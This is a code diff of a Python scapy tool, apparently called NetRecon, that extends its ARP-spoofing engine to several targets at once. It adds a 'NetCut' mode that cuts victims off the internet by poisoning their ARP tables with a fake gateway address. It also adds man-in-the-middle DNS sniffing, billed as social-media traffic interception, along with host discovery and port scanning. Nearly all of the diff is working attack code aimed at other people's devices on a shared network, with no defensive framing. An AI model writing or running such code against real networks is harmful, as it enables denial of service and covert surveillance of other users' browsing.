@@ -7,7 +7,7 @@ import sys
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
-from scapy.all import ARP, DNS, DNSQR, IP, UDP, Ether, send, sniff, srp
+from scapy.all import ARP, DNS, DNSQR, IP, UDP, Ether, send, sendp, sniff, srp
 
 # =================================================================
 #                     HELPER FUNCTIONS
@@ -44,7 +44,7 @@ def get_gateway_ip(local_ip):
 def get_mac(ip):
   try:
     ans, _ = srp(
-        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=1, verbose=False
+        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=0.5, verbose=False
     )
     for _, rcv in ans:
       return rcv[Ether].src
@@ -89,52 +89,83 @@ def disable_ip_forwarding():
 
 
 # =================================================================
-#                     ARP SPOOFING (MITM) ENGINE
+#                     ARP SPOOFING & NETCUT ENGINE
 # =================================================================
 
 
-def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
-  print(
-      f"[*] ARP Spoofing active: Target ({target_ip}) <---> Gateway"
-      f" ({gateway_ip})"
-  )
+def arp_spoof(target_ips, gateway_ip, gateway_mac, stop_event, cut_internet=False, interface=None):
+  targets_info = []
+  for t_ip in target_ips:
+    t_mac = get_mac(t_ip)
+    if t_mac:
+      targets_info.append({"ip": t_ip, "mac": t_mac})
+
+  mode_str = "NETCUT (Internet Blocked)" if cut_internet else "MITM Sniffing"
+  print(f"[*] ARP Engine Active [{mode_str}] for targets: {target_ips}")
+
   while not stop_event.is_set():
-    send(
-        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
-        verbose=False,
-    )
-    send(
-        ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
-        verbose=False,
-    )
+    for target in targets_info:
+      fake_gateway_hw = "00:11:22:33:44:55" if cut_internet else gateway_mac
+      
+      # Scapy warning'ini önlemek için sendp ve Ether katmanı kullanıldı
+      sendp(
+          Ether(dst=target["mac"]) / ARP(
+              op=2,
+              pdst=target["ip"],
+              hwdst=target["mac"],
+              psrc=gateway_ip,
+              hwsrc=fake_gateway_hw,
+          ),
+          iface=interface,
+          verbose=False,
+      )
+      
+      if not cut_internet and gateway_mac:
+        sendp(
+            Ether(dst=gateway_mac) / ARP(
+                op=2,
+                pdst=gateway_ip,
+                hwdst=gateway_mac,
+                psrc=target["ip"],
+                hwsrc=target["mac"],
+            ),
+            iface=interface,
+            verbose=False,
+        )
     time.sleep(2)
 
 
-def restore_network(target_ip, target_mac, gateway_ip, gateway_mac):
-  print("\n[*] Restoring network ARP tables...")
-  send(
-      ARP(
-          op=2,
-          pdst=target_ip,
-          hwdst="ff:ff:ff:ff:ff:ff",
-          psrc=gateway_ip,
-          hwsrc=gateway_mac,
-      ),
-      count=3,
-      verbose=False,
-  )
-  send(
-      ARP(
-          op=2,
-          pdst=gateway_ip,
-          hwdst="ff:ff:ff:ff:ff:ff",
-          psrc=target_ip,
-          hwsrc=target_mac,
-      ),
-      count=3,
-      verbose=False,
-  )
-  print("[+] Network restored.")
+def restore_network(target_ips, gateway_ip, interface=None):
+  print("\n[*] Restoring network ARP tables for targets...")
+  gateway_mac = get_mac(gateway_ip)
+  for t_ip in target_ips:
+    t_mac = get_mac(t_ip)
+    if t_mac and gateway_mac:
+      sendp(
+          Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+              op=2,
+              pdst=t_ip,
+              hwdst="ff:ff:ff:ff:ff:ff",
+              psrc=gateway_ip,
+              hwsrc=gateway_mac,
+          ),
+          iface=interface,
+          count=3,
+          verbose=False,
+      )
+      sendp(
+          Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+              op=2,
+              pdst=gateway_ip,
+              hwdst="ff:ff:ff:ff:ff:ff",
+              psrc=t_ip,
+              hwsrc=t_mac,
+          ),
+          iface=interface,
+          count=3,
+          verbose=False,
+      )
+  print("[+] Network fully restored.")
 
 
 # =================================================================
@@ -158,14 +189,8 @@ def ping_host(ip):
   return None
 
 
-def scan_network(subnet):
-  print(
-      "\n================================================================="
-  )
-  print("              FAST HOST DISCOVERY (Lightning Scan)               ")
-  print(
-      "================================================================="
-  )
+def scan_network_fast(subnet):
+  print("\n[*] Running Fast IP Discovery (Pure Ping Sweep)...")
   try:
     net = ipaddress.ip_network(subnet, strict=False)
   except ValueError as e:
@@ -173,52 +198,57 @@ def scan_network(subnet):
     return []
 
   active_hosts = []
-  print(f"[*] Scanning {subnet} for active devices (Please wait)...")
-
   with ThreadPoolExecutor(max_workers=100) as executor:
     results = executor.map(ping_host, net.hosts())
     for ip in results:
       if ip:
-        print(f"[+] Active Host Discovered: {ip}")
         active_hosts.append(ip)
-
-  print(f"==================================================")
-  print(f"[+] Scan Completed. Total Active Hosts: {len(active_hosts)}")
-  return active_hosts
+  return sorted(active_hosts, key=lambda ip: ipaddress.ip_address(ip))
 
 
-def scan_ports_for_target(target_ip):
-  print(
-      "\n------------------------------------------------------------------"
-  )
-  print(f"[*] Quick Port Scan on Target: {target_ip}")
+def scan_network_detailed(subnet):
+  print("\n[*] Running Deep ARP & Vendor Scan (Captures all MACs/Vendors)...")
+  try:
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=False)
+    active_hosts = []
+    for _, rcv in ans:
+      active_hosts.append(rcv[IP].src)
+    return sorted(list(set(active_hosts)), key=lambda ip: ipaddress.ip_address(ip))
+  except Exception as e:
+    print(f"[-] Detailed scan error: {e}")
+    return []
+
+
+def scan_ports_for_targets(target_ips):
   common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 8080]
-  open_ports = []
+  for target_ip in target_ips:
+    print(
+        f"\n------------------------------------------------------------------"
+    )
+    print(f"[*] Quick Port Scan on Target: {target_ip}")
+    
+    def check_port(port):
+      try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.4)
+        result = s.connect_ex((target_ip, port))
+        s.close()
+        if result == 0:
+          return port
+      except Exception:
+        pass
+      return None
 
-  def check_port(port):
-    try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      s.settimeout(0.4)
-      result = s.connect_ex((target_ip, port))
-      s.close()
-      if result == 0:
-        return port
-    except Exception:
-      pass
-    return None
+    with ThreadPoolExecutor(max_workers=10) as executor:
+      results = executor.map(check_port, common_ports)
+      open_ports = [p for p in results if p]
 
-  with ThreadPoolExecutor(max_workers=10) as executor:
-    results = executor.map(check_port, common_ports)
-    for p in results:
-      if p:
+    if open_ports:
+      for p in open_ports:
         print(f"    [+] Open Port Discovered: {p}")
-        open_ports.append(p)
-
-  if not open_ports:
-    print("    [-] No common open ports found or firewall blocking.")
-  print(
-      "------------------------------------------------------------------"
-  )
+    else:
+      print("    [-] No common open ports found or firewall blocking.")
+  print("------------------------------------------------------------------")
 
 
 # =================================================================
@@ -262,8 +292,8 @@ def main():
   print(
       "================================================================="
   )
-  print("                    NetRecon v4.1 (Optimized)                    ")
-  print("     Ultimate Network Recon, Brand Sniffer & Social Monitor      ")
+  print("                    NetRecon v4.4 (Optimized)                    ")
+  print("     Ultimate Network Recon, NetCut & Social Monitor             ")
   print(
       "================================================================="
   )
@@ -277,7 +307,6 @@ def main():
 
   auto_ip, auto_subnet = get_local_ip_and_subnet()
 
-  # İstediğin subnet seçim ekranı tekrar eklendi!
   print("\n------------------------------------------------------------------")
   print("SUBNET SELECTION:")
   print(f"1. Auto-detect (Recommended: {auto_subnet})")
@@ -293,148 +322,143 @@ def main():
     subnet_input = auto_subnet
     print(f"[*] Auto-selected subnet: {subnet_input}")
 
+  print("\n------------------------------------------------------------------")
+  print("SCAN MODE SELECTION:")
+  print("1. Fast IP Scan (Lightning fast ping sweep - ONLY IPs)")
+  print("2. Detailed ARP & Vendor Scan (Captures all MACs & Vendors)")
+  print("------------------------------------------------------------------")
+  scan_mode = input("[*] Choose scan mode (1 or 2): ").strip()
+
   while True:
-    active_hosts = scan_network(subnet_input)
+    if scan_mode == "2":
+      active_hosts = scan_network_detailed(subnet_input)
+    else:
+      active_hosts = scan_network_fast(subnet_input)
+
     if not active_hosts:
       print("[-] No active hosts found on the network.")
       break
 
     print("\n------------------------------------------------------------------")
-    print("SELECT TARGET DEVICE FROM DISCOVERED HOSTS:")
+    print("DISCOVERED HOSTS ON NETWORK:")
     print("------------------------------------------------------------------")
 
     gateway_ip = get_gateway_ip(auto_ip)
 
-    for idx, host in enumerate(active_hosts):
-      h_mac = get_mac(host)
-      h_vendor = get_device_vendor(h_mac)
-      h_name = get_hostname(host)
-      gw_tag = " (GATEWAY)" if host == gateway_ip else ""
-      print(
-          f"    {idx}. IP: {host}{gw_tag} | MAC: {h_mac} | Hostname: {h_name} |"
-          f" Vendor: {h_vendor}"
-      )
+    # Eğer hızlı tarama seçildiyse MAC/Vendor sorgulaması yapmadan anında sadece IP göster
+    if scan_mode == "1":
+      for idx, host in enumerate(active_hosts):
+        gw_tag = " (GATEWAY)" if host == gateway_ip else ""
+        print(f"    [{idx}] IP: {host}{gw_tag}")
+    else:
+      # Detaylı taramada zaten MAC'ler var, hemen yazdır
+      def fetch_host_details(host):
+        h_mac = get_mac(host)
+        h_vendor = get_device_vendor(h_mac)
+        h_name = get_hostname(host)
+        return host, h_mac, h_vendor, h_name
 
+      with ThreadPoolExecutor(max_workers=20) as executor:
+        host_details = list(executor.map(fetch_host_details, active_hosts))
+
+      for idx, (host, h_mac, h_vendor, h_name) in enumerate(host_details):
+        gw_tag = " (GATEWAY)" if host == gateway_ip else ""
+        print(
+            f"    [{idx}] IP: {host}{gw_tag} | MAC: {h_mac} | Hostname: {h_name} |"
+            f" Vendor: {h_vendor}"
+        )
+
+    print("\n[!] MULTI-TARGET SELECTION ADVICE:")
+    print("    You can select multiple targets by entering indexes separated by commas.")
+    print("    Example: 0,2,5  (Avoid selecting the Gateway unless testing)")
+    
     try:
-      choice = int(
-          input("\n[*] Enter the number of the target device to inspect: ")
-      )
-      target_ip = active_hosts[choice]
+      choices_input = input("\n[*] Enter target index(es) to select: ").strip()
+      indexes = [int(i.strip()) for i in choices_input.split(",")]
+      target_ips = [active_hosts[i] for i in indexes]
     except (ValueError, IndexError):
-      print("[-] Invalid selection. Returning to menu...")
+      print("[-] Invalid selection format. Returning to menu...")
       continue
 
     while True:
-      target_mac = get_mac(target_ip)
-      target_vendor = get_device_vendor(target_mac)
-      target_hostname = get_hostname(target_ip)
-
       print(
           "\n================================================================="
       )
-      print(f"TARGET SELECTED: {target_ip}")
-      print(
-          f"MAC: {target_mac} | Hostname: {target_hostname} | Vendor:"
-          f" {target_vendor}"
-      )
+      print(f"SELECTED TARGETS: {target_ips}")
       print(
           "================================================================="
       )
-      print("1. Run Quick Port Scan")
+      print("1. Run Quick Port Scan on Selected Target(s)")
       print("2. Start DNS Sniffing & MITM (Target Specific / ARP Spoofing)")
-      print("3. Start Universal DNS Sniffing (All Network / MITM)")
-      print("4. Rescan Network / Change Target")
+      print("3. NetCut Mode (Block Internet Access for Selected Target(s))")
+      print("4. Rescan Network / Change Targets")
       print("------------------------------------------------------------------")
 
       action = input("[*] Choose an action (1-4): ").strip()
 
       if action == "1":
-        scan_ports_for_target(target_ip)
+        scan_ports_for_targets(target_ips)
         input("\n[*] Press Enter to return to target menu...")
 
       elif action == "2" or action == "3":
-        if action == "3":
-          print("[*] Universal DNS Sniffing mode active...")
-
         gateway_mac = get_mac(gateway_ip)
-        if not target_mac or not gateway_mac:
-          print("[-] Error: Could not resolve MAC addresses. Try again.")
+        if not gateway_mac:
+          print("[-] Error: Could not resolve Gateway MAC address. Try again.")
           continue
 
-        print(
-            "\n------------------------------------------------------------------"
-        )
-        print("SNIFFING TERMINATION CRITERIA:")
-        print("1. Stop after specific timeout (e.g., 30 seconds)")
-        print("2. Stop after specific DNS query count (e.g., 10 packets)")
-        print("3. Unlimited (Run until manual interruption - Ctrl+C)")
-        print(
-            "------------------------------------------------------------------"
-        )
-        limit_choice = input("[*] Enter choice (1, 2, or 3): ").strip()
-
-        sniff_timeout = None
-        sniff_count = 0
-
-        if limit_choice == "1":
-          try:
-            sniff_timeout = int(
-                input("[*] Enter timeout in seconds (e.g., 20): ").strip()
-            )
-          except ValueError:
-            sniff_timeout = 30
-        elif limit_choice == "2":
-          try:
-            sniff_count = int(
-                input(
-                    "[*] Enter target DNS query packet count limit (e.g., 10):"
-                    " "
-                ).strip()
-            )
-          except ValueError:
-            sniff_count = 10
-
-        enable_ip_forwarding()
+        cut_mode = True if action == "3" else False
+        if cut_mode:
+          print("[!] NETCUT ACTIVE: Blocking internet access for selected targets...")
+          disable_ip_forwarding()
+        else:
+          print("[*] Universal DNS Sniffing & MITM active...")
+          enable_ip_forwarding()
 
         stop_event = threading.Event()
         spoof_thread = threading.Thread(
             target=arp_spoof,
-            args=(target_ip, target_mac, gateway_ip, gateway_mac, stop_event),
+            args=(target_ips, gateway_ip, gateway_mac, stop_event, cut_mode, interface),
         )
         spoof_thread.daemon = True
         spoof_thread.start()
 
-        print(
-            "\n================================================================="
-        )
-        print(
-            f"[*] Listening on interface: {interface if interface else 'default'}"
-        )
-        print(
-            "[*] MITM DNS SNIFFING ACTIVE (Social Media & Traffic Interception)"
-        )
-        print(
-            "================================================================="
-        )
-
-        try:
-          sniff(
-              iface=interface,
-              filter="udp port 53",
-              prn=dns_callback,
-              store=0,
-              timeout=sniff_timeout,
-              count=sniff_count,
+        if not cut_mode:
+          print(
+              "\n================================================================="
           )
-          print("\n[+] Sniffing criteria reached. Restoring network...")
-        except KeyboardInterrupt:
-          print("\n[*] Stopping sniffer by user...")
+          print(
+              f"[*] Listening on interface: {interface if interface else 'default'}"
+          )
+          print(
+              "[*] MITM DNS SNIFFING ACTIVE (Social Media & Traffic Interception)"
+          )
+          print(
+              "================================================================="
+          )
+
+          try:
+            sniff(
+                iface=interface,
+                filter="udp port 53",
+                prn=dns_callback,
+                store=0,
+            )
+          except KeyboardInterrupt:
+            print("\n[*] Stopping sniffer by user...")
+        else:
+          print("\n[+] NetCut is running. Press Ctrl+C to stop and restore network.")
+          try:
+            while True:
+              time.sleep(1)
+          except KeyboardInterrupt:
+            pass
 
         stop_event.set()
         spoof_thread.join()
-        restore_network(target_ip, target_mac, gateway_ip, gateway_mac)
+        restore_network(target_ips, gateway_ip, interface)
+        
         disable_ip_forwarding()
-        print("[+] Network restored.")
+        print("[+] Network restored completely.")
         input("\n[*] Press Enter to return to target menu...")
 
       elif action == "4":
